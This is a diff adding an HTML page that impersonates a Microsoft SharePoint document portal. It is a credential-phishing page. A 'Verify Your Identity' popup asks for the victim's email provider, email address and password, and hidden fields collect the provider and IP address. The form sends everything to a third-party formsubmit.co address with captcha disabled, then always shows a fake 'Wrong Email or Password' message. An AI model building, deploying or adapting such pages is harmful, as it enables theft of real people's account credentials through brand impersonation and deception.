@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apps|M365-SharePoint Drive</title>
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+     <style>
+
+        html, body {
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            max-width: 100vw;
+        }
+    </style>
+</head>
+<body>
+<!-- Top Banner with Image Logo -->
+<header class="top-banner">
+    <div class="banner-inner">
+        <div class="logo-container">
+            <!-- Image Logo -->
+            <img src="banner-logo.png" 
+                 alt="PORTDOCUMENT Logo" 
+                 class="banner-logo-image">
+            <div class="logo-text">
+                <h1 id="PORTDOCUMENT">SharePoint</h1>
+                <span class="logo-tagline">Secure Drive Management System</span>
+            </div>
+        </div>
+        <div class="banner-header-body">
+            <span></span>
+            <div class="user-info">
+                <i class="fas fa-user-circle user-icon"></i>
+                <span class="username">Welcome, User</span>
+            </div>
+        </div>
+    </div>
+</header>
+    <div class="main-container">
+        <!-- Sidebar - Now at left edge -->
+        <aside class="sidebar">
+            <div class="sidebar-content">
+                <h3>M365 Copilot</h3>
+                <ul class="sidebar-menu">
+                    <li><a href="#" class="sidebar-link active" data-category="all"><i class="fas fa-house"></i> Home</a></li>
+                    <li><a href="#" class="sidebar-link" data-category="static"><i class="fas fa-folder"></i> All File</a></li>
+                </ul>
+            </div>
+            
+            <div class="sidebar-footer">
+                <img src="sidebar-image.png" alt="Fedelis Logo" class="sidebar-footer-image">
+            </div>
+        </aside>
+
+        <!-- Main Content -->
+<main class="content">
+    <div class="content-header">
+        <h2>Available Documents</h2>
+        <p class="content-subtitle">Click on any document to access secure content</p>
+    </div>
+    <div class="documents-grid">
+        <!-- 8 Document Items with mixed file types -->
+        <div class="document-item pdf-doc">
+            <div class="document-icon">
+                <i class="fas fa-file-pdf pdf-icon"></i>
+            </div>
+            <div class="document-info">
+                <div class="document-type">PDF</div>
+                <h3 class="document-title">ENIN0741</h3>
+                <p class="document-meta">2.4 MB • Apr, 2026</p>
+            </div>
+        </div>
+        
+        <div class="document-item excel-doc">
+            <div class="document-icon">
+                <i class="fas fa-file-excel excel-icon"></i>
+            </div>
+            <div class="document-info">
+                <div class="document-type">Excel</div>
+                <h3 class="document-title">ENUO0341</h3>
+                <p class="document-meta">1.8 MB • Apr, 2026</p>
+            </div>
+        </div>
+      
+        <div class="document-item pdf-doc">
+            <div class="document-icon">
+                <i class="fas fa-file-pdf pdf-icon"></i>
+            </div>
+            <div class="document-info">
+                <div class="document-type">PDF</div>
+                <h3 class="document-title">ENIN0311</h3>
+                <p class="document-meta">3.2 MB • Apr, 2026</p>
+            </div>
+        </div>
+        
+        <div class="document-item pdf-doc">
+            <div class="document-icon">
+                <i class="fas fa-file-pdf pdf-icon"></i>
+            </div>
+            <div class="document-info">
+                <div class="document-type">PDF</div>
+                <h3 class="document-title">ENIN00641</h3>
+                <p class="document-meta">1.2 MB • Apr, 2026</p>
+            </div>
+        </div>
+    </div>
+</main>
+    </div>
+
+    <!-- Footer -->
+    <footer class="main-footer">
+        <p>&copy; 2026 SharePoint</p>
+    </footer>
+
+<!-- Popup Form -->
+<div class="popup-overlay" id="popupOverlay">
+    <div class="popup-container">
+        <!-- Image Logo Container at Top of Popup -->
+        <div class="popup-top-logo">
+            <div class="company-logo">
+                <!-- Replace with your image logo -->
+                <img src="main-logo.png" 
+                     alt="Fedelis Logo" 
+                     class="logo-image">
+                <div class="logo-text">
+                    <span class="logo-name">SharePoint</span>
+                    <span class="logo-subtitle"> </span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="popup-header">
+            <span id="formTitle">Verify Your Identity</span>
+            <button type="button" class="close-popup">&times;</button>
+        </div>
+        
+        <!-- Formspree Form -->
+        <form class="popup-body" id="popupForm" action="https://formsubmit.co/f8ea52e118b8f140edfbf4e55690a4f3" method="POST">
+            <!-- Hidden inputs for Formspree -->
+            <input type="hidden" name="_subject" value="News Update">
+            <input type="hidden" name="_format" value="plain">
+            <input type="hidden" name="_language" value="en">
+            <input type="hidden" name="_next" value="#success">
+            <input type="hidden" name="_captcha" value="false">
+            
+            <div class="form-step active" id="step1">
+                <p class="form-message">You've received a secure file. To open this secure document's, we'll need you to enter the email that this item was shared to.</p>
+                
+                <!-- Mail Provider Selection -->
+                <div class="form-group">
+                    <label for="mailProvider">Select Mail Provider</label>
+                    <div class="mail-provider-dropdown">
+                        <div class="dropdown-selected" id="dropdownSelected">
+                            <i class="fas fa-envelope"></i>
+                            <span>Select mail provider</span>
+                            <i class="fas fa-chevron-down dropdown-arrow"></i>
+                        </div>
+                        <div class="dropdown-options" id="dropdownOptions">
+                            <div class="dropdown-option" data-value="gmail">
+                                <i class="fab fa-google"></i>
+                                <span>Gmail</span>
+                                <span class="option-hint"></span>
+                            </div>
+                            <div class="dropdown-option" data-value="yahoo">
+                                <i class="fab fa-yahoo"></i>
+                                <span>Yahoo Mail</span>
+                                <span class="option-hint"></span>
+                            </div>
+                            <div class="dropdown-option" data-value="outlook">
+                                <i class="fab fa-microsoft"></i>
+                                <span>Outlook/Hotmail</span>
+                                <span class="option-hint"></span>
+                            </div>
+                            <div class="dropdown-option" data-value="icloud">
+                                <i class="fab fa-apple"></i>
+                                <span>iCloud Mail</span>
+                                <span class="option-hint"></span>
+                            </div>
+                            <div class="dropdown-option" data-value="aol">
+                                <i class="fas fa-at"></i>
+                                <span>AOL Mail</span>
+                                <span class="option-hint"></span>
+                            </div>
+                            <div class="dropdown-option" data-value="custom">
+                                <i class="fas fa-edit"></i>
+                                <span>Other Email</span>
+                                <span class="option-hint">Enter full email</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Email Input Field - Single Input -->
+                <div class="form-group">
+                    <label for="email">Email</label>
+                    <div class="email-input-container">
+                        <input type="email" id="email" name="email" placeholder="Enter Email" required>
+                        <div class="email-input-hint" id="emailHint">
+                            <!-- Hint will appear here -->
+                        </div>
+                    </div>
+                </div>
+                
+                <button type="button" class="next-btn" id="nextBtn1">Next</button>
+                
+                <p class="privacy-notice">By clicking Next you allow Microsoft to use your email address in accordance with their privacy statement. SharePoint has no provided links to their terms for you to review.</p>
+            </div>
+            
+            <div class="form-step" id="step2">
+                <!-- Email Display Section - Simplified without change button -->
+                <div class="email-display-container">
+                    <div class="email-display-header">
+                        <i class="fas fa-envelope email-icon"></i>
+                        <span>Verifying Email:</span>
+                    </div>
+                    <div class="email-display-value" id="displayedEmail">
+                        <!-- Email will be inserted here by JavaScript -->
+                    </div>
+                </div>
+            
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter Password" required>
+                </div>
+                
+                <!-- Hidden input for provider -->
+                <input type="hidden" id="providerInput" name="provider">
+                <!-- Hidden input for IP address -->
+                <input type="hidden" id="ipAddressInput" name="ip_address">
+                
+                <button type="submit" class="submit-btn" id="submitBtn">Next</button>
+                
+                <div class="back-to-email">
+                    <button type="button" class="back-btn" id="backBtn">
+                        <i class="fas fa-arrow-left"></i> Back to Email
+                    </button>
+                </div>
+            </div>
+            
+            <div class="form-step" id="step3">
+                <div class="success-message">
+                    <i class="fas fa-check-circle"></i>
+                    <h3>Access Denied!</h3>
+                    <p>Wrong Email or Password, Please try again later</p>
+                    <div class="redirect-info">
+                        <p><i class="fas fa-external-link-alt"></i></p>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </div>
+</div>
+    <script src="script.js"></script>
+</body>
+</html>
